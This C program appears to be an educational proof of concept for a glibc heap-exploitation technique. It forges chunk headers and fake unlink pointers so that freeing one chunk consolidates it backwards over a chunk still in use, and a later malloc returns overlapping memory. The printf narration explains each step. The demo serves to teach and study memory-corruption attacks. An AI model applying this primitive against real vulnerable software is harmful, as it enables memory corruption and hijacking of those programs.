#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x420


void main() {

    long *chunk0,
            *chunk1,
            *chunk2,
            *consolidated_chunk;

    printf("In this instance, we will try to allocate a chunk twice.\n");
    printf("We will do this via consolidating the next adjacent chunk backwards, to encompass the entirety of the two chunks.\n");
    printf("Then we will allocate the larger consolidated chunk, which encompasses both of the chunks.\n");
    printf("Let's allocate three chunks for us to use!\n\n");

    chunk0 = malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE0);
    chunk2 = malloc(CHUNK_SIZE0);

    printf("Chunk0:\t%p\n", chunk0);
    printf("Chunk1:\t%p\n", chunk1);
    printf("Chunk2:\t%p\n\n", chunk2);

    printf("After some prep, we will free chunk1, to consolidate it into chunk0.\n");
    printf("Then we will reallocate the memory of chunk0 without actually freeing it.\n\n");

    printf("Starting off, we will change the chunk header of chunk1, to make it look like the previous chunk is freed.\n");
    printf("We will need to set the prev_size equal to the size of chunk1.\n");
    printf("In addition to that, we will need to clear the prev_inuse flag of the size value of chunk1.\n\n");

    chunk1[-2] = (CHUNK_SIZE0 + 0x10);
    chunk1[-1] = (CHUNK_SIZE0 + 0x10);

    printf("Next up, we will have to prepare again for the main arena bin unlinking of chunk0.\n");
    printf("We will store the fake main arena head chunk in chunk2.\n\n");

    chunk0[0] = (long)chunk2;
    chunk0[1] = (long)chunk2;

    chunk2[2] = (long)&chunk0[-2];
    chunk2[3] = (long)&chunk0[-2];

    printf("Now, we will free chunk1, to cause heap consolidation.\n\n");

    free(chunk1);

    printf("Finally we will allocate a chunk size, to get the consolidated chunk allocated.\n\n");

    consolidated_chunk = malloc(((CHUNK_SIZE0 + 0x10) * 2) - 0x10);

    printf("Consolidated Chunk:\t%p\n", consolidated_chunk);
    printf("Consolidated Chunk is the same address as Chunk0:\t%s\n\n", (consolidated_chunk == chunk0) ? "True" : "False");
}
